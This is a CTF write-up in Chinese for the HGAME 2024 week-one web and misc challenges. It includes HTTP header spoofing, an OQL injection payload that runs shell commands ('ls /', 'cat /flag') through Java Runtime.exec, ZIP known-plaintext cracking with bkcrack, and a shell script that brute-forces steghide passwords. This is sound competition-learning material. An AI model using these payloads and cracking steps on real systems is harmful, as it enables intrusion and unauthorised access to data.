# HGAME2024_week1


HGAME2024_week1_web&misc

<!--more-->

# Week1

## web

### [ezHTTP]

exp：

```
GET / HTTP/1.1
Host: 47.100.245.185:31927
Referer: vidar.club
X-Real-IP: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

使用repeater发包后，解码响应的jwt得到flag

![image-20240203010816645](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240203010816645.png)

1. 请从vidar.club登录：

   ```
   Referer: vidar.club
   ```

2. 请使用`Mozilla/5.0 (Vidar; VidarOS x86_64)......`访问

   ```
   User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0
   ```

3. 请从本地登录

   ```
   X-Real-IP: 127.0.0.1
   //X-Forwarded-For失效，或许黑名单了
   ```

### [Bypass it]

This page requires javascript to be enabled :)

开启js无法注册，将js禁用可成功注册，随后登录得到flag

### [Select Courses]

对每个课程疯狂发包

exp:

```
POST /api/courses HTTP/1.1
Host: 47.100.245.185:30640
Content-Length: 8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://47.100.245.185:30640
Referer: http://47.100.245.185:30640/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

{"id":3}
```

![image-20240203173327940](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240203173327940.png)

### [2048\*16]

#### 解法1：base64换表

在js里面发现两串疑似base编码的字符串

![image-20240214171233976](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240214171233976.png)

![image-20240214171326343](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240214171326343.png)

base64换表

![image-20240214171347068](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240214171347068.png)

#### 解法2：js拦截修改

参考：
https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/

拦截环境页面js之前先清除一下浏览器的js缓存

![image-20240223144911531](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240223144911531.png)

随后在bp设置中，把不拦截js规则取消

![image-20240223145006997](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240223145006997.png)

![image-20240223145054049](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240223145054049.png)

修改返回的js中关键代码，`<.9?2:4`，2和4都修改为16384

```
var n=Math[x(494)]()<.9?2:4,e=new j(this.grid[x(477)](),n);
```

![image-20240223145243255](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240223145243255.png)

![image-20240223144818885](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240223144818885.png)

### [jhat]

![image-20240216123323260](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216123323260.png)

[OQL(对象查询语言)在产品实现中造成的RCE(Object Injection)](https://wooyun.kieran.top/#!/drops/415.OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection))

[JVM 对象查询语言（OQL）](https://blog.csdn.net/pange1991/article/details/82023771)

```
new java.util.Scanner(java.lang.Runtime.getRuntime().exec('ls /').getInputStream())
new java.util.Scanner(java.lang.Runtime.getRuntime().exec('cat /flag').getInputStream())
```

![image-20240216123720183](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216123720183.png)

![image-20240216123737079](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216123737079.png)

## misc

### [Sign in]

https://lab.magiconch.com/xzk/

![image-20240205223026314](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205223026314.png)

从底部平视或者用图像编辑软件自动校正一下

### [签到]

![image-20240205223120871](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205223120871.png)

### [希尔希尔希尔]

![image-20240204224421916](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204224421916.png)

然后

![image-20240204224606496](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204224606496.png)

发现key

同时

![image-20240204224812276](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204224812276.png)

提取出来，是个压缩包，得到：

![image-20240204224919698](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204224919698.png)

在线解密网站

https://ctf.bugku.com/tool/hill

![image-20240204225045045](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204225045045.png)

### [simple_attack]

压缩后的大小不同，但CRC冗余循环检验是一样的

![image-20240204232633914](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240204232633914.png)

明文攻击

工具：ARCHPR 4.54

![image-20240205142517316](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205142517316.png)

工具：bkcrack

> https://cloud.tencent.com/developer/article/2215202
>
> **安装：**
> 先从github获取资源，windows中安装bkcrack还需要额外安装VC++的Redistributable
>
> ```
> git clone https://github.com/kimci86/bkcrack.git
> ```
>
> 然后配置cmake工具，需要用到cmake手动构建brack的项目代码
>
> ```
> pip install cmake
> ```
>
> 安装好后进入bkcrack文件夹内分别运行三段代码
>
> ```
> cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install
> cmake --build build --config Release
> cmake --build build --config Release --target install
> ```
>
> 进入install文件夹通过终端运行
>
> ![image-20240205123950453](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205123950453.png)
>
> **使用：**
>
> ```cmd
> C:\Users\scofi\Desktop\bkcrack\install>bkcrack.exe -C Downloads.zip -c aa.png -P aa.zip -p aa.png
> ```
>
> 其中-C表示密文（cipher），-p为明文（plaintext）
>
> -C指外层文件，-c指内层文件
>
> ![image-20240205140351422](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205140351422.png)
>
> 下一步
>
> ```sh
> bkcrack.exe -C Downloads.zip -c aa.png -k e0be8d5d 70bb3140 7e983fff -d uncracked
> ```
>
> -d指定存文件的路径
>
> ![image-20240205142057120](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205142057120.png)
>
> 随后
>
> ```
> bkcrack -C attachment.zip -k key -U new.zip good
> ```
>
> -U表示更改密码，前面是新压缩包的名，后面是设置的密码
>
> ![image-20240205142329289](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205142329289.png)

得到的txt文本进行`base64 to file`，base64->图片

![image-20240205233939812](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205233939812.png)

### [来自星辰的问候]

![image-20240205223229314](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205223229314.png)

根据提示，六位弱密码，通过steghide爆破

```
steghide info secret.jpg
```

![image-20240205225240973](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205225240973.png)

生成一个6位数数字密码

```
crunch 6 6 0123456789 > passwd.txt
```

然后通过shell脚本，进行steghide密码爆破

```shell
#bruteStegHide.sh
#!/bin/bash

for line in `cat $2`;do
    steghide extract -sf $1 -p $line > /dev/null 2>&1
    if [[ $? -eq 0 ]];then
        echo 'password is: '$line
        exit
    fi
done
```

随后

```shell
./bruteStegHide.sh ../scofield/secret.jpg passwd.txt
```

得到密码`123456`

提取文件

```shell
steghide extract -sf secret.jpg -p 123456
```

![image-20240205231212627](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205231212627.png)

解压压缩包，得到图片和一个离线网页

![image-20240205231731305](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205231731305.png)

随后在网上搜索来自星尘这款游戏的字体

https://github.com/MY1L/Ctrl/releases

通过比对，得到flag

![image-20240205233337514](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240205233337514.png)

